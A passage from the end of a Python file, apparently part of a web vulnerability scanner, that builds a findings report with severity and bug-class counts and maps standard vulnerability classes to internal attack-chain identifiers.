            "confidence": 0.85 if bug_class != "info-disclosure" else 0.30,
            "found_at": now,
        })

    by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    by_class = {}
    for f in formatted:
        by_severity[f["severity"]] = by_severity.get(f["severity"], 0) + 1
        by_class[f["bug_class"]] = by_class.get(f["bug_class"], 0) + 1

    obs_formatted = []
    for r in observations:
        obs_formatted.append({
            "id": r.observation_id,
            "endpoint": r.endpoint,
            "method": r.method,
            "state": "unknown",
            "probe": r.notes,
            "observation_ref": f"state/observations/{_domain(target)}.jsonl",
        })

    return {
        "target": target,
        "scan_ts": now,
        "version": "2.3.0",
        "mode": "+".join(mode_parts),
        "findings": formatted,
        "observations": obs_formatted,
        "stats": {
            "total_findings": len(formatted),
            "total_observations": len(obs_formatted),
            "by_severity": by_severity,
            "by_class": by_class,
        },
    }


def _map_class_to_chains(bug_class: str) -> List[str]:
    """Map a bug class to potential kill chains it could participate in."""
    mapping = {
        "idor": ["CHAIN-001"],
        "sqli": ["CHAIN-016", "CHAIN-020"],
        "xss-reflected": ["CHAIN-004", "CHAIN-005"],
        "xss-stored": ["CHAIN-004", "CHAIN-005"],
        "ssrf": ["CHAIN-003", "CHAIN-020"],
        "open-redirect": ["CHAIN-002", "CHAIN-006"],
        "ssti": ["CHAIN-016"],
        "rce": ["CHAIN-003", "CHAIN-016"],
        "race-condition-web": ["CHAIN-008"],
        "graphql-introspection": ["CHAIN-009"],
        "jwt-bypass": ["CHAIN-010"],
        "cors-misconfiguration": ["CHAIN-011"],
        "host-header-injection": ["CHAIN-012"],
        "csrf": ["CHAIN-013"],
        "subdomain-takeover": ["CHAIN-014"],
        "cache-poisoning": ["CHAIN-005"],
        "request-smuggling": ["CHAIN-006"],
        "business-logic": ["CHAIN-007", "CHAIN-008"],
        "oauth-bypass": ["CHAIN-002", "CHAIN-007"],
        "broken-auth": ["CHAIN-007", "CHAIN-010"],
        "path-traversal": ["CHAIN-016"],
        "xxe": ["CHAIN-020", "CHAIN-021"],
        "deserialization": ["CHAIN-023"],
        "mass-assignment": ["CHAIN-022"],
        "prototype-pollution": ["CHAIN-019"],
    }
    return mapping.get(bug_class, [])


if __name__ == "__main__":
    main()
